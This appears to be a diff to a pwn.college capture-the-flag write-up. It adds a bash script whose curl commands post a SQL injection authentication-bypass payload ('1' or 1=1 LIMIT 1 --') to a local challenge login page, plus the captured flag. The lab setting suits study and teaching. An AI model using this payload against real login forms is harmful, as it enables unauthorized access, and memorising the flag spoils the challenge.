@@ -8,12 +8,12 @@ The previous level's SQL injection was quite simple to pull off and still have a
 
 ```bash
 #!/bin/bash
-
-
+curl -c cookies.txt -X POST -d "login-name=admin&pword=1' or 1=1 LIMIT 1 --" http://challenge.localhost/auth
+curl -b cookies.txt http://challenge.localhost/auth
 ```
 
 ## Solution
 
 ```
-
+pwn.college{gGNNgMb7rFStrvlbzgO-xdiUer6.dBTOzMDL3MTM3QzW}
 ```
